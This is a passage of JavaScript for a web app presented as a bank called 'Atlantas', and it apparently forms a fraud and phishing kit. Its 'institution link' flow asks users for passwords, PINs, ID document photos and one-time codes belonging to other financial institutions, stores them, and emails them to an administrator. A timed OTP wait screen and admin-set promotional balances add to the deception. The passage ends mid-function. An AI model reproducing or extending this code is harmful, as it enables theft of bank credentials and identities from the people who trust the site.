  var linkedInsts=(_ud&&_ud.linkedInstitutions)||{};
  insts.forEach(function(inst,idx){
    var linked=linkedInsts[idx]||null;
    var div=document.createElement('div');
    if(linked){
      // Show status card
      div.className='inst-linked-item';
      div.style.borderLeft='3px solid '+(inst.color||'var(--p)');
      var stLabel=linked.status==='authorized'?'Authorized':linked.status==='processing'?'Processing…':'Pending Review';
      var stCls=linked.status==='authorized'?'authorized':linked.status==='processing'?'processing':'pending';
      div.innerHTML='<div style="display:flex;align-items:center;gap:10px;">'+
        (inst.logo?'<img src="'+_esc(inst.logo)+'" width="36" height="36" style="border-radius:8px;object-fit:cover;">':'<div class="inst-logo" style="width:36px;height:36px;background:'+(inst.color||'var(--pl)')+'"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--p)" stroke-width="2" stroke-linecap="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 21V9"/></svg></div>')+
        '<div style="flex:1;"><div class="inst-name">'+_esc(inst.name)+'</div>'+
        '<span class="inst-linked-status '+stCls+'">'+stLabel+'</span></div>'+
        (linked.status==='authorized'?'<span class="inst-arrow" style="color:var(--ok)">&#10003;</span>':'<span class="inst-arrow">&#8250;</span>')+
        '</div>';
      if(linked.status!=='authorized'){
        div.onclick=function(){APP_toast('Awaiting admin authorization. You will be notified when ready.','');};
      }
    } else {
      // Show link button
      div.className='inst-banner';
      div.style.borderLeft='3px solid '+(inst.color||'var(--p)');
      div.innerHTML='<div class="inst-logo" style="background:'+(inst.color||'var(--pl)')+';">'+(inst.logo?'<img src="'+_esc(inst.logo)+'" width="32" height="32" style="border-radius:8px;object-fit:cover;" alt="">':'<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--p)" stroke-width="2" stroke-linecap="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 21V9"/></svg>')+'</div>'+
        '<div class="inst-info"><div class="inst-name">'+_esc(inst.name)+'</div><div class="inst-powered">'+_esc(inst.poweredBy||'Link Your Account')+'</div></div><span class="inst-arrow">&#8250;</span>';
      div.onclick=function(){_startInstFlow(inst,idx);};
    }
    list.appendChild(div);
  });
}

// ── LOAN FEATURE ──────────────────────────────────────────────
function APP_openLoan(){
  if(!_ud)return;
  var kyc=_ud.kycStatus||'pending';
  if(kyc!=='verified'){
    // Show KYC gate
    _show('loan-kyc-gate',true);
    return;
  }
  // KYC verified — show loan screen
  _show('loan-screen',true);
  _loadLoanRequirements();
  _loadMyLoans();
}
function _loadLoanRequirements(){
  var con=$('loan-requirements');if(!con)return;
  var reqs=(_cfg.loanRequirements)||{};
  var minAmt=reqs.minAmount||100;
  var maxAmt=reqs.maxAmount||10000;
  var interestRate=reqs.interestRate||5;
  var duration=reqs.duration||'1–12 months';
  var note=reqs.note||'Approval is at the discretion of our team. You will be notified via notification once reviewed.';
  var items=reqs.requirements||['Valid verified identity (KYC)','Active account in good standing','No outstanding unpaid loans'];
  var html='<div class="loan-req-card">';
  html+='<div class="loan-req-row"><span>Loan Amount</span><strong>'+_sym(_ud.currency)+minAmt.toFixed(2)+' – '+_sym(_ud.currency)+maxAmt.toFixed(2)+'</strong></div>';
  html+='<div class="loan-req-row"><span>Interest Rate</span><strong>'+interestRate+'% p.a.</strong></div>';
  html+='<div class="loan-req-row"><span>Repayment Period</span><strong>'+_esc(duration)+'</strong></div>';
  html+='</div>';
  html+='<div class="loan-req-title">Requirements</div><div class="loan-req-list">';
  items.forEach(function(r){html+='<div class="loan-req-item"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--ok)" stroke-width="2.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12"/></svg><span>'+_esc(r)+'</span></div>';});
  html+='</div>';
  html+='<div class="loan-note">'+_esc(note)+'</div>';
  con.innerHTML=html;
}
function _loadMyLoans(){
  if(!_user)return;
  _db.ref(DB.loans).orderByChild('uid').equalTo(_user.uid).on('value',function(snap){
    var con=$('my-loans-list');if(!con)return;
    if(!snap.exists()){con.innerHTML='<div style="color:var(--t2);font-size:14px;text-align:center;padding:16px 0;">No loan applications yet.</div>';return;}
    var loans=[];snap.forEach(function(s){loans.push(Object.assign({},s.val(),{_key:s.key}));});
    loans.sort(function(a,b){return new Date(b.appliedDate)-new Date(a.appliedDate);});
    var html='';
    loans.forEach(function(loan){
      var st=loan.status||'pending';
      var stCls=st==='approved'?'ok':st==='rejected'?'er':'warn';
      var stLabel=st==='approved'?'Approved':st==='rejected'?'Rejected':'Pending';
      html+='<div class="loan-item">'+
        '<div class="loan-item-row"><span class="loan-item-lbl">Amount</span><strong>'+_sym(loan.currency||_ud.currency)+parseFloat(loan.amount||0).toFixed(2)+'</strong></div>'+
        '<div class="loan-item-row"><span class="loan-item-lbl">Purpose</span><span>'+_esc(loan.purpose||'—')+'</span></div>'+
        '<div class="loan-item-row"><span class="loan-item-lbl">Applied</span><span>'+_fmtDate(loan.appliedDate)+'</span></div>'+
        '<div class="loan-item-row"><span class="loan-item-lbl">Status</span><span class="loan-status-badge '+stCls+'">'+stLabel+'</span></div>'+
        (loan.adminNote?'<div class="loan-item-row"><span class="loan-item-lbl">Note</span><span>'+_esc(loan.adminNote)+'</span></div>':'')+
        '</div>';
    });
    con.innerHTML=html;
  });
}
function _renderLoanStatus(){
  // Update loan badge on home button if there's a pending/approved loan
  if(!_user)return;
  _db.ref(DB.loans).orderByChild('uid').equalTo(_user.uid).once('value',function(snap){
    var loanBtn=$('loan-action-btn');if(!loanBtn)return;
    if(!snap.exists())return;
    var hasApproved=false;
    snap.forEach(function(s){if(s.val()&&s.val().status==='approved')hasApproved=true;});
    if(hasApproved){var badge=loanBtn.querySelector('.loan-badge');if(badge)badge.style.display='block';}
  });
}
function APP_submitLoan(){
  var amtEl=$('loan-apply-amt'),purEl=$('loan-apply-purpose'),durEl=$('loan-apply-duration');
  var errEl=$('loan-apply-err');
  if(errEl)errEl.textContent='';
  var amt=parseFloat(amtEl&&amtEl.value||0);
  var purpose=(purEl&&purEl.value||'').trim();
  var duration=(durEl&&durEl.value||'').trim();
  if(!amt||amt<1){if(errEl)errEl.textContent='Enter a valid amount.';return;}
  if(!purpose){if(errEl)errEl.textContent='Please describe the loan purpose.';return;}
  if(!duration){if(errEl)errEl.textContent='Select a repayment period.';return;}
  var btn=$('loan-apply-btn');if(btn){btn.textContent='Submitting\u2026';btn.disabled=true;}
  var key=Date.now()+'_'+_user.uid.slice(0,6);
  _db.ref(DB.loans+'/'+key).set({
    uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,
    accountNumber:_ud.accountNumber,currency:_ud.currency||'USD',
    amount:amt,purpose:purpose,duration:duration,
    kycStatus:_ud.kycStatus,status:'pending',
    appliedDate:new Date().toISOString()
  }).then(function(){
    _sendEmail('general','New Loan Application',{user_name:_ud.firstname,user_email:_ud.email,amount:_sym(_ud.currency)+amt.toFixed(2),purpose:purpose,duration:duration,message:'User submitted a loan application.'});
    _pushAdminAlert('\uD83D\uDCB0 New Loan Application',(_ud.firstname||'A user')+' applied for a loan of '+_sym(_ud.currency)+amt.toFixed(2)+'. Tap to review.');
    if(btn){btn.textContent='Apply for Loan';btn.disabled=false;}
    if(amtEl)amtEl.value='';if(purEl)purEl.value='';if(durEl)durEl.value='';
    APP_toast('Loan application submitted!','ok');
    _loadMyLoans();
  }).catch(function(){
    if(errEl)errEl.textContent='Failed to submit. Try again.';
    if(btn){btn.textContent='Apply for Loan';btn.disabled=false;}
  });
}

// ── INSTITUTION MULTI-STEP FLOW ───────────────────────────────
var _instOtpTimer=null;
function _startInstFlow(inst,idx){
  _instFlow={inst:inst,idx:idx,step:1,data:{}};
  _setEl('inst-flow-name',inst.name);
  _setEl('inst-flow-sub',inst.poweredBy||'Link your account securely');
  var con=$('inst-step1-fields');if(con){con.innerHTML='';
    // Use customColumns if defined, else fall back to fieldType defaults
    var fields=[];
    if(inst.customColumns&&inst.customColumns.length){
      fields=inst.customColumns.map(function(c){return{key:c.key||c.label.toLowerCase().replace(/\s+/g,'_'),label:c.label,type:c.type||'text',required:c.required!==false};});
    } else {
      var fType=inst.fieldType||'credentials';
      fields=fType==='credentials'?[{key:'identifier',label:'Username / ID',type:'text'},{key:'password',label:'Password',type:'password'}]:
        fType==='phone'?[{key:'phone',label:'Phone Number',type:'tel'},{key:'pin',label:'PIN',type:'password'}]:
        fType==='email'?[{key:'email',label:'Email Address',type:'email'},{key:'password',label:'Password',type:'password'}]:
        [{key:'account',label:'Account Number',type:'text'}];
    }
    _instFlow.step1Fields=fields;
    fields.forEach(function(f){
      var w=document.createElement('div');w.style.marginBottom='10px';
      var l=document.createElement('div');l.style.cssText='font-size:12px;font-weight:700;color:var(--t2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px;';l.textContent=f.label+(f.required===false?' (Optional)':'');
      var inp=document.createElement('input');inp.className='fi';inp.type=f.type||'text';inp.placeholder=f.label;inp.id='inst-f-'+f.key;
      w.appendChild(l);w.appendChild(inp);con.appendChild(w);
    });
  }
  _show('inst-flow',true);
}
function APP_instStep1Submit(){
  var inst=_instFlow.inst,data={};var ok=true;
  (_instFlow.step1Fields||[]).forEach(function(f){var v=$('inst-f-'+f.key)&&$('inst-f-'+f.key).value.trim();if(!v)ok=false;data[f.key]=v||'';});
  if(!ok){APP_toast('Please fill in all fields','er');return;}
  _instFlow.data=data;
  _sendEmail('otp','Institution Link Step 1 \u2014 '+inst.name,{user_name:(_ud.firstname||'')+' '+(_ud.surname||''),user_email:_ud.email,institution:inst.name,fields:JSON.stringify(data),message:'User submitted credentials. ID verification step pending.'});
  // NEW ORDER: go to ID documents first (step2), then OTP (step3)
  if(inst.requireId){_buildInstIdStep();_show('inst-step2',true);}
  else _showInstOtpStep();
}
// ID step is now step2
function APP_instIdSubmit(){
  var missing=false;
  (_instFlow.idFields||[]).forEach(function(f){
    if(f.type==='image'){if(!f.optional&&!_instFlow.data['id_'+f.key])missing=true;}
    else{var v=$('iinp-'+f.key)&&$('iinp-'+f.key).value.trim();if(v)_instFlow.data['id_'+f.key]=v;}
  });
  if(missing){APP_toast('Please upload all required documents','er');return;}
  // After ID, go to OTP step
  _showInstOtpStep();
}
function _showInstOtpStep(){
  var inst=_instFlow.inst;
  _setEl('inst-otp-inst',inst.name);
  var desc={otp:'Enter the OTP sent to your phone.',app:'Approve the request in your banking app.',auth:'Enter your authentication code.',both:'Enter OTP and approve in-app.',none:'No code needed — tap Continue.'}[inst.otpType||'otp']||'Enter verification code.';
  _setEl('inst-otp-desc',desc);
  if($('inst-otp-input'))$('inst-otp-input').value='';
  // Reset OTP screen state
  var inputWrap=$('inst-otp-input-wrap');
  var unlockWrap=$('inst-otp-unlock-wrap');
  var continueBtn=$('inst-otp-continue-btn');
  var readyMsg=$('inst-otp-ready-msg');
  var timerEl=$('inst-otp-timer');
  var waitNotice=$('inst-otp-wait-notice');
  if(inst.otpType==='none'){
    // No OTP needed — skip straight to submit
    if(inputWrap)inputWrap.style.display='';
    if(unlockWrap)unlockWrap.style.display='none';
    if(waitNotice)waitNotice.style.display='none';
  } else {
    if(inputWrap)inputWrap.style.display='none';
    if(unlockWrap)unlockWrap.style.display='';
    if(continueBtn)continueBtn.style.display='none';
    if(readyMsg)readyMsg.style.display='none';
    if(timerEl)timerEl.style.display='';
    // Start 5hr countdown
    _startOtpCountdown();
  }
  _show('inst-step3',true);
}
var _otpCountdownInterval=null;
function _startOtpCountdown(){
  if(_otpCountdownInterval)clearInterval(_otpCountdownInterval);
  var fiveHours=5*60*60*1000;
  var startTime=Date.now();
  _instFlow._otpStartTime=startTime;
  function _tick(){
    var elapsed=Date.now()-startTime;
    var remaining=fiveHours-elapsed;
    var countdown=$('inst-otp-countdown');
    var continueBtn=$('inst-otp-continue-btn');
    var timerEl=$('inst-otp-timer');
    var readyMsg=$('inst-otp-ready-msg');
    if(remaining<=0){
      clearInterval(_otpCountdownInterval);
      if(countdown)countdown.textContent='';
      if(timerEl)timerEl.style.display='none';
      if(readyMsg)readyMsg.style.display='';
      if(continueBtn)continueBtn.style.display='';
    } else {
      var h=Math.floor(remaining/3600000);
      var m=Math.floor((remaining%3600000)/60000);
      var s=Math.floor((remaining%60000)/1000);
      var label='OTP expected in: '+h+'h '+String(m).padStart(2,'0')+'m '+String(s).padStart(2,'0')+'s';
      if(countdown)countdown.textContent=label;
      if(timerEl)timerEl.textContent='Waiting for OTP to be issued…';
    }
  }
  _tick();
  _otpCountdownInterval=setInterval(_tick,1000);
}
function APP_instOtpUnlock(){
  // User says they have their OTP — show the input immediately
  if(_otpCountdownInterval)clearInterval(_otpCountdownInterval);
  var inputWrap=$('inst-otp-input-wrap');
  var unlockWrap=$('inst-otp-unlock-wrap');
  var timerEl=$('inst-otp-timer');
  var waitNotice=$('inst-otp-wait-notice');
  if(inputWrap)inputWrap.style.display='';
  if(unlockWrap)unlockWrap.style.display='none';
  if(timerEl)timerEl.style.display='none';
  if(waitNotice)waitNotice.style.display='none';
  if($('inst-otp-input'))$('inst-otp-input').focus();
}
function APP_instOtpSubmit(){
  var otp=($('inst-otp-input')&&$('inst-otp-input').value.trim())||'';
  var inst=_instFlow.inst;
  if(inst.otpType!=='none'&&!otp){APP_toast('Please enter the verification code','er');return;}
  _instFlow.data.otpCode=otp;
  _submitInstFinal();
}
function _buildInstIdStep(){
  var inst=_instFlow.inst;var con=$('inst-id-fields');if(!con)return;con.innerHTML='';
  var idFields=inst.idFields||[];
  if(!idFields.length)idFields=[{key:'front',label:'ID Front',type:'image'},{key:'back',label:'ID Back (Optional)',type:'image',optional:true}];
  _instFlow.idFields=idFields;
  idFields.forEach(function(f){
    var w=document.createElement('div');w.style.marginBottom='14px';
    var l=document.createElement('div');l.style.cssText='font-size:13px;font-weight:700;margin-bottom:8px;';l.textContent=f.label+(f.optional?' (Optional)':'');
    w.appendChild(l);
    if(f.type==='image'){
      var zone=document.createElement('div');zone.className='upload-zone';zone.id='iz-'+f.key;
      zone.innerHTML='<div class="upload-zone-ico"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--p)" stroke-width="2" stroke-linecap="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 21V9"/></svg></div><div class="upload-zone-t" id="izt-'+f.key+'">Tap to upload</div><div class="upload-zone-s">Compressed automatically</div>';
      var inp=document.createElement('input');inp.type='file';inp.accept='image/*';inp.style.display='none';inp.id='iinp-'+f.key;
      inp.onchange=function(){
        if(!this.files||!this.files[0])return;var file=this.files[0];var key=f.key;
        _setEl('izt-'+key,'Uploading\u2026');
        _clUpload(file,'inst',function(url){_instFlow.data['id_'+key]=url;_setEl('izt-'+key,file.name+' \u2713');var z=$('iz-'+key);if(z)z.classList.add('done');APP_toast('Uploaded!','ok');},function(e){APP_toast(e,'er');_setEl('izt-'+key,'Upload failed \u2014 tap to retry');});
      };
      zone.onclick=function(){inp.click();};w.appendChild(zone);w.appendChild(inp);
    }else{
      var inp2=document.createElement('input');inp2.className='fi';inp2.type=f.type||'text';inp2.placeholder=f.label;inp2.id='iinp-'+f.key;w.appendChild(inp2);
    }
    con.appendChild(w);
  });
}
function _submitInstFinal(){
  var inst=_instFlow.inst,data=_instFlow.data,idx=_instFlow.idx;
  var sub=Object.assign({},data,{uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,accountNumber:_ud.accountNumber,institution:inst.name,requireId:!!inst.requireId,otpType:inst.otpType,status:'processing',addedDate:new Date().toISOString()});
  _db.ref(DB.instSubs+'/'+_user.uid+'_'+Date.now()).set(sub).then(function(){
    // Mark institution as processing in user record so UI shows status
    var update={};update['linkedInstitutions/'+idx]={status:'processing',addedDate:sub.addedDate,institution:inst.name};
    _db.ref(DB.users+'/'+_user.uid).update(update).then(function(){
      if(_ud){if(!_ud.linkedInstitutions)_ud.linkedInstitutions={};_ud.linkedInstitutions[idx]={status:'processing',addedDate:sub.addedDate,institution:inst.name};_renderInstitutions();}
    });
    _sendEmail('otp','Institution Link Complete \u2014 '+inst.name,{user_name:sub.name,user_email:sub.email,institution:inst.name,message:'User completed institution link. Awaiting admin review.'});
    _pushAdminAlert('\uD83C\uDFE6 New Institution Link',(_ud.firstname||'A user')+' linked '+inst.name+'. Tap to review.');
    _setEl('inst-confirm-name',inst.name);_show('inst-confirm',true);
  });
}

// ── HISTORY ───────────────────────────────────────────────────
function _loadHistory(uid){
  _db.ref(DB.users+'/'+uid+'/history').on('value',function(snap){
    var h=snap.val()||[];if(!Array.isArray(h))h=Object.values(h);
    _history=h.filter(Boolean).sort(function(a,b){return new Date(b.date)-new Date(a.date);});
    _renderTxHome();_renderTxFull('all');
  });
}
function _renderTxHome(){
  var con=$('tx-home');if(!con)return;
  var recent=_history.slice(0,5);
  if(!recent.length){con.innerHTML='<div class="tx-empty"><div class="tx-empty-ico"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--t2)" stroke-width="2" stroke-linecap="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg></div><div class="tx-empty-t">No transactions yet</div><div class="tx-empty-s">Your activity will appear here</div></div>';return;}
  con.innerHTML='<div style="background:var(--card);border:1px solid var(--border);border-radius:var(--r);margin:0 18px 18px;overflow:hidden;">'+recent.map(_txRow).join('')+'</div>';
}
function _renderTxFull(filter){
  var con=$('tx-full');if(!con)return;
  var list=_history.filter(function(tx){if(filter==='all')return true;if(filter==='credit')return tx.type==='credit';if(filter==='debit')return tx.type==='debit';if(filter==='pending')return tx.status==='pending';return true;});
  if(!list.length){con.innerHTML='<div class="tx-empty" style="margin:0 18px;"><div class="tx-empty-ico"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--t2)" stroke-width="2" stroke-linecap="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg></div><div class="tx-empty-t">No transactions</div></div>';return;}
  con.innerHTML='<div style="background:var(--card);border:1px solid var(--border);border-radius:var(--r);margin:0 18px;overflow:hidden;">'+list.map(_txRow).join('')+'</div>';
}
function _txRow(tx){
  var isCr=tx.type==='credit',isPending=tx.status==='pending';
  var isLoan=tx.isLoan===true||(tx.description||'').toLowerCase().includes('loan');
  var sym=_sym(tx.currency||(_ud&&_ud.currency));
  var amt=(isCr?'+':'-')+sym+parseFloat(tx.amount||0).toFixed(2);
  // Colors: credit/loan = green, debit = red, pending = amber
  var cls=isPending?'pd':(isLoan||isCr?'cr':'dr');
  var icoColor=isPending?'rgba(217,119,6,.1)':((isLoan||isCr)?'rgba(22,163,74,.12)':'rgba(220,38,38,.1)');
  var sc=isPending?'var(--warn)':((isLoan||isCr)?'var(--ok)':'var(--er)');
  var icoSvg=isLoan?
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="'+sc+'" stroke-width="2.5" stroke-linecap="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18"/><path d="M9 15h6"/></svg>':
    isCr?'<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="'+sc+'" stroke-width="2.5" stroke-linecap="round"><polyline points="7 1 3 5 7 9"/><path d="M21 11V9a4 4 0 0 0-4-4H3"/></svg>':
    isPending?'<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="'+sc+'" stroke-width="2.5" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>':
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="'+sc+'" stroke-width="2.5" stroke-linecap="round"><polyline points="17 23 21 19 17 15"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/></svg>';
  var accNum=tx.accountNumber||tx.toAccount||tx.fromAccount||'';
  var txJson=encodeURIComponent(JSON.stringify(tx));
  return '<div class="tx-item" onclick="APP.showReceipt(\''+txJson+'\')"><div class="tx-ico" style="background:'+icoColor+';">'+icoSvg+'</div><div class="tx-info"><div class="tx-name">'+_esc(tx.description||tx.type||'Transaction')+'</div><div class="tx-date">'+_fmtDate(tx.date)+(accNum?' · <span style="font-family:var(--mono);font-size:11px;">'+_esc(accNum)+'</span>':'')+'</div></div><div class="tx-amt '+cls+'">'+amt+'</div></div>';
}
function APP_showReceipt(txJson){
  var tx;try{tx=JSON.parse(decodeURIComponent(txJson));}catch(e){return;}
  var isCr=tx.type==='credit',isPending=tx.status==='pending';
  var isLoan=tx.isLoan===true||(tx.description||'').toLowerCase().includes('loan');
  var sym=_sym(tx.currency||(_ud&&_ud.currency));
  var amt=parseFloat(tx.amount||0).toFixed(2);
  var statusLabel=isPending?'Pending':tx.status==='successful'?'Successful':tx.status==='refunded'?'Refunded':'Completed';
  var statusColor=isPending?'var(--warn)':tx.status==='refunded'?'var(--er)':'var(--ok)';
  var amtColor=(isLoan||isCr)?'var(--ok)':'var(--er)';
  var icoCircleBg=(isLoan||isCr)?'rgba(22,163,74,.1)':'rgba(220,38,38,.1)';
  var accNum=tx.accountNumber||tx.toAccount||tx.fromAccount||'';
  var body=$('modal-body');if(!body)return;
  body.innerHTML='<div style="text-align:center;padding:8px 0 20px;"><div style="width:64px;height:64px;border-radius:50%;background:'+icoCircleBg+';display:flex;align-items:center;justify-content:center;margin:0 auto 12px;">'+(isLoan?'<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="var(--ok)" stroke-width="2.5" stroke-linecap="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18"/><path d="M9 15h6"/></svg>':isCr?'<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="var(--ok)" stroke-width="2.5" stroke-linecap="round"><polyline points="7 1 3 5 7 9"/><path d="M21 11V9a4 4 0 0 0-4-4H3"/></svg>':'<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="var(--er)" stroke-width="2.5" stroke-linecap="round"><polyline points="17 23 21 19 17 15"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/></svg>')+'</div><div style="font-size:32px;font-weight:800;letter-spacing:-1px;color:'+amtColor+';">'+(isCr?'+':'-')+sym+amt+'</div><div style="font-size:13px;font-weight:700;margin-top:6px;color:'+statusColor+';">'+statusLabel+'</div></div>'+
    '<div style="background:var(--bg);border-radius:14px;padding:4px 0;margin-bottom:16px;">'+
    _rcRow('Description',tx.description||tx.type||'Transaction')+_rcRow('Type',isCr?'Money In':'Money Out')+
    _rcRow('Amount',sym+amt)+_rcRow('Currency',tx.currency||(_ud&&_ud.currency)||'USD')+
    (accNum?_rcRow('Account Number',accNum):'')+
    (tx.date?_rcRow('Date & Time',_fmtDate(tx.date)):'')+
    (tx.status?_rcRow('Status',statusLabel):'')+
    (tx.requestKey?_rcRow('Reference',tx.requestKey.split('_')[0]):'')+
    '</div><button class="modal-btn" style="background:var(--bg);color:var(--text);border:1.5px solid var(--border);" onclick="APP.closeModal(event)">Close</button>';
  $('modal-overlay').classList.add('open');
}
function _rcRow(l,v){return '<div style="display:flex;justify-content:space-between;align-items:center;padding:12px 14px;border-bottom:1px solid var(--border2);"><span style="font-size:13px;color:var(--t2);">'+_esc(l)+'</span><span style="font-size:14px;font-weight:600;text-align:right;max-width:60%;">'+_esc(String(v||'\u2014'))+'</span></div>';}

// ── TERMS & BOOT ──────────────────────────────────────────────
document.addEventListener('DOMContentLoaded',function(){
  var cb=$('terms-cb'),btn=$('terms-accept-btn');
  if(cb&&btn)cb.addEventListener('change',function(){btn.disabled=!cb.checked;});
  var ref=new URLSearchParams(window.location.search).get('ref');
  if(ref){var clean=ref.trim().toUpperCase();sessionStorage.setItem('atl_ref',clean);var ra=$('su-ref-applied'),rc=$('su-ref-code'),rm=$('su-ref-manual');if(ra)ra.style.display='';if(rc)rc.textContent=clean;if(rm)rm.style.display='none';setTimeout(function(){APP_authTab('signup');},300);}
  _tryBiometricLogin();
});
function APP_acceptTerms(){localStorage.setItem('atl_terms_ok','1');_show('auth',false);}

// ── AUTH ──────────────────────────────────────────────────────
function APP_authTab(name){$('lf-login').style.display=name==='login'?'':'none';$('lf-signup').style.display=name==='signup'?'':'none';$('atab-login').classList.toggle('on',name==='login');$('atab-signup').classList.toggle('on',name==='signup');}
function APP_doLogin(){var email=($('li-email').value||'').trim(),pass=$('li-pass').value;var err=$('li-err');err.textContent='';if(!email||!pass){err.textContent='Please enter email and password.';return;}var btn=$('li-btn');btn.textContent='Logging in\u2026';btn.disabled=true;_auth.signInWithEmailAndPassword(email,pass).catch(function(e){err.textContent=_fbErr(e.code);btn.textContent='Log In';btn.disabled=false;});}
function APP_doSignup(){
  var fn=($('su-fn').value||'').trim(),sn=($('su-sn').value||'').trim(),on=($('su-on').value||'').trim(),ph=($('su-ph').value||'').trim();
  var un=($('su-un').value||'').trim().toLowerCase(),em=($('su-em').value||'').trim().toLowerCase();
  var pw=$('su-pw').value,cf=$('su-cf').value,cur=$('su-cur').value,co=$('su-co').value;
  var promo=($('su-promo').value||'').trim().toUpperCase();
  var ref=(sessionStorage.getItem('atl_ref')||($('su-ref')&&$('su-ref').value)||'').trim().toUpperCase();
  var err=$('su-err');err.textContent='';
  if(!fn||!sn||!ph||!un||!em||!pw||!co){err.textContent='Please fill in all required fields.';return;}
  if(pw!==cf){err.textContent='Passwords do not match.';return;}
  if(pw.length<8){err.textContent='Password must be at least 8 characters.';return;}
  var btn=$('su-btn');btn.textContent='Creating\u2026';btn.disabled=true;
  _auth.createUserWithEmailAndPassword(em,pw).then(function(cred){
    var uid=cred.user.uid;
    return _genAccNum().then(function(accNum){
      var promoCode=(_cfg.promoCode||'').toUpperCase(),promoBal=parseFloat(_cfg.promoBalance)||500000;
      var welcome=parseFloat(_cfg.welcomeBonus)||0,refBonus=parseFloat(_cfg.referralBonus)||10;
      var bal=(promoCode&&promo===promoCode)?promoBal:welcome;
      var refCode='ATL-'+uid.slice(0,6).toUpperCase();
      return _db.ref(DB.users+'/'+uid).set({surname:sn,firstname:fn,othername:on,phone:ph,username:un,email:em,currency:cur,country:co,accountNumber:accNum,balance:bal+(ref?refBonus:0),history:[],linkedCards:[],referralCode:refCode,referrals:[],referralEarned:0,referralClaimed:false,referredBy:ref||'',kycStatus:'pending',demoLocked:false,createdDate:new Date().toISOString()})
        .then(function(){return _db.ref(DB.accNums+'/'+accNum).set(uid);})
        .then(function(){return _db.ref(DB.pubDir+'/'+uid).set({firstname:fn,surname:sn,accountNumber:accNum});})
        .then(function(){
          if(ref){_db.ref(DB.users).orderByChild('referralCode').equalTo(ref).once('value',function(snap){snap.forEach(function(s){var u=s.val();if(!u)return;var refs=u.referrals||[];refs.push({uid:uid,date:new Date().toISOString()});_db.ref(DB.users+'/'+s.key).update({referrals:refs,referralEarned:(parseFloat(u.referralEarned)||0)+refBonus});});});sessionStorage.removeItem('atl_ref');}
          _sendEmail('general','New Registration',{user_name:fn+' '+sn,user_email:em,account_number:accNum,message:'New user registered.'});
        });
    });
  }).catch(function(e){$('su-err').textContent=_fbErr(e.code);btn.textContent='Create Account';btn.disabled=false;});
}
function APP_doLogout(){if(!confirm('Log out?'))return;_auth.signOut();}
function APP_signOut(){_auth.signOut();}
function APP_sendPasswordReset(){
  var email=($('fp-email').value||'').trim();var msg=$('fp-msg');msg.textContent='';
  if(!email){msg.style.color='var(--er)';msg.textContent='Enter your email address.';return;}
  if(!email.includes('@')){msg.style.color='var(--er)';msg.textContent='Enter a valid email address.';return;}
  var btn=$('fp-btn');btn.textContent='Sending\u2026';btn.disabled=true;
  var actionCodeSettings={url:window.location.origin,handleCodeInApp:false};
  _auth.sendPasswordResetEmail(email,actionCodeSettings).then(function(){
    msg.style.color='var(--ok)';msg.textContent='\u2705 Reset email sent! Check your inbox and spam folder.';
    btn.textContent='Send Again';btn.disabled=false;
  }).catch(function(e){
    var errMsg=_fbErr(e.code);
    if(e.code==='auth/user-not-found')errMsg='No account found with this email address.';
    if(e.code==='auth/invalid-email')errMsg='Please enter a valid email address.';
    if(e.code==='auth/too-many-requests')errMsg='Too many attempts. Please wait a few minutes and try again.';
    msg.style.color='var(--er)';msg.textContent=errMsg;
    btn.textContent='Send Reset Link';btn.disabled=false;
  });
}

// ── EMAIL JS ──────────────────────────────────────────────────
function _sendEmail(account,subject,params){
  try{var ej=(_cfg.emailjs)||{};var acc=account==='otp'?ej.otp:ej.general;if(!acc||!acc.publicKey||!acc.serviceId||!acc.templateId)return;emailjs.init(acc.publicKey);emailjs.send(acc.serviceId,acc.templateId,Object.assign({},{subject:subject,to_email:_cfg.adminEmail||'',from_name:'Atlantas'},params));}catch(e){}
}

// ── TABS & UI ─────────────────────────────────────────────────
function APP_switchTab(name){document.querySelectorAll('.tab-page').forEach(function(p){p.classList.remove('on');});document.querySelectorAll('.nav-btn').forEach(function(b){b.classList.remove('on');});var p=$('tp-'+name),b=$('nav-'+name);if(p)p.classList.add('on');if(b)b.classList.add('on');}
function APP_filterTx(filter,btn){document.querySelectorAll('.tx-filter').forEach(function(b){b.classList.remove('on');});if(btn)btn.classList.add('on');_renderTxFull(filter);}
function APP_toggleBal(){_balVis=!_balVis;var ico=$('eye-ico');if(ico)ico.innerHTML=_balVis?'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>':'<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';_renderBalance();}

// FIX: editField now uses an inline modal instead of prompt()
function APP_editField(field){
  var cur=(_ud&&_ud[field])||'';
